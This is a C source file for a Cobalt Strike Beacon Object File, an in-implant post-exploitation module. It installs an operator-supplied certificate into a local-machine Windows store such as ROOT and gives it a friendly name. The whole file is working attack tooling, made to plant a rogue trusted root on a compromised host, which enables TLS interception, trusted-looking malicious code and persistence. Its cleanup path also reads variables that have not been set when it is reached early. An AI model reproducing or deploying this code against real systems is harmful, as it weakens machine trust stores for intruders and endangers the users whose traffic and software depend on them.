#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include "addlocalcert.h"
#include "beacon.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Advapi32.lib")



BOOL addCertificateToRootStore(wchar_t *store, const char *friendlyName, const char *certFileBytes, int iBytesLen) {
    BOOL result = FALSE;
    HCERTSTORE hStore = NULL;
    PCCERT_CONTEXT pCertContext = NULL;

    // Open Local Computer store
    hStore = CRYPT32$CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, (HCRYPTPROV)NULL, CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_OPEN_EXISTING_FLAG, store); 
    if (!hStore) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open specified certificate store\n");
        goto cleanup;
    }

    // Add the encoded certificate to the store
    PCCERT_CONTEXT pCertAdded = NULL;
    BOOL addCertResult = CRYPT32$CertAddEncodedCertificateToStore(hStore, X509_ASN_ENCODING, certFileBytes, iBytesLen, CERT_STORE_ADD_NEW, &pCertAdded); //CERT_STORE_ADD_NEW | CERT_STORE_ADD_REPLACE_EXISTING
    if (!addCertResult) {
        DWORD dwError = KERNEL32$GetLastError();
        if (dwError == 5 || dwError == 0x80070005) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to add certificate to the store due to insufficient privileges.\n");
        } else if (dwError == 0x80092005) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to add certificate to the store because the certificate already exists.\n");
		} else if (dwError == 0x80093102) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to add certificate to the store because the certificate is invalid.\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR,"Failed to add certificate to the store with error code: %x\n", dwError);
        }
        goto cleanup;
    }

    result = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Certificate added successfully to store!\n");

    // Set the "Friendly Name" property
    CRYPT_DATA_BLOB friendlyNameBlob;
    DWORD friendlyNameLen = MSVCRT$strlen(friendlyName) + 1;
    WCHAR *friendlyNameW = (WCHAR *)KERNEL32$LocalAlloc(LPTR, friendlyNameLen * sizeof(WCHAR));
    if (!friendlyNameW) goto cleanup;

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, friendlyName, -1, friendlyNameW, friendlyNameLen);
    friendlyNameBlob.cbData = friendlyNameLen * sizeof(WCHAR);
    friendlyNameBlob.pbData = (BYTE *)friendlyNameW;

    if (!CRYPT32$CertSetCertificateContextProperty(pCertAdded, CERT_FRIENDLY_NAME_PROP_ID, 0, &friendlyNameBlob)) goto cleanup;

cleanup:
    if (hStore) CRYPT32$CertCloseStore(hStore, 0);
    if (friendlyNameW) KERNEL32$LocalFree(friendlyNameW);
    if (pCertAdded) CRYPT32$CertFreeCertificateContext(pCertAdded);

    return result;
}


int go(char *args, int len) {
	WCHAR *store = NULL; // Options: ROOT, MY, TRUST, CA, USERDS, AuthRoot, Disallowed
	CHAR *friendlyName = NULL;
	int iBytesLen = 0;
	CHAR *certFileBytes;
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	certFileBytes = BeaconDataExtract(&parser, &iBytesLen);
	store = BeaconDataExtract(&parser, NULL);
	friendlyName = BeaconDataExtract(&parser, NULL);
	
	
	if(iBytesLen != 0) {
		if(store != NULL) {
			BeaconPrintf(CALLBACK_OUTPUT, "Starting task to add certificate to %ls store..\n", store);
			BeaconPrintf(CALLBACK_OUTPUT, "Found and loaded certificate into memory with file size: %d\n", iBytesLen);
		
			addCertificateToRootStore(store, friendlyName, certFileBytes, iBytesLen);
		} else BeaconPrintf(CALLBACK_ERROR, "Please specify the name of the local computer store to open.\n");
	} else BeaconPrintf(CALLBACK_ERROR, "Couldn't find the specified certificate file on disk.\n");

	

	return 0;
}